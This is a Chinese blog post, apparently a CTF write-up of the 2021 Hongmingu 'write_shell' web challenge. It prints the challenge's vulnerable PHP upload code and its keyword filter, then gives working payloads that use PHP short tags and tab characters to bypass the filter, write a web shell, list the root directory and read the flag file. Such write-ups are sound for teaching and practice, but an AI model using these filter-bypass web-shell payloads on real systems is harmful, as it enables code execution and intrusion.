---
layout: post
title: 红明谷CTF 2021 write_shell
date: 2021-07-30 16:56 +0800
last_modified_at: 2021-07-30 16:56:00 +0800
tags: [CTF,Web,Write-up]
toc:  true
---
关键词：php短标签

首页代码审计，得到代码如下：

```
<?php
error_reporting(0);
highlight_file(__FILE__);
function check($input){
    if(preg_match("/'| |_|php|;|~|\\^|\\+|eval|{|}/i",$input)){
        // if(preg_match("/'| |_|=|php/",$input)){
        die('hacker!!!');
    }else{
        return $input;
    }
}

function waf($input){
  if(is_array($input)){
      foreach($input as $key=>$output){
          $input[$key] = waf($output);
      }
  }else{
      $input = check($input);
  }
}

$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
if(!file_exists($dir)){
    mkdir($dir);
}
switch($_GET["action"] ?? "") {
    case 'pwd':
        echo $dir;
        break;
    case 'upload':
        $data = $_GET["data"] ?? "";
        waf($data);
        file_put_contents("$dir" . "index.php", $data);
}
?>
```

从`preg_match`中不难看出此题在data中屏蔽了`php`关键字，也屏蔽了`eval _ ^ ~ +`以及空格等关键字，因而看似不能执行php命令，但可以采用php短标签绕过：

```
<?echo 'a';?>    <==>    <?php echo 'a';?>
```

所以此题大致思路为：通过action设为upload进行写入，再将action设为pwd进行读取dir获取index.php位置，最终访问index.php完成代码执行。

payload：

```
?action=upload&data=<?echo%09`ls%09/`?>
//获取根目录文件列表，用%09绕过空格过滤
?action=pwd
//获取index.php所在位置
?action=upload&data=<?echo%09`cat%09/flllllll1112222222lag`?>
//获取根目录下的flag
```

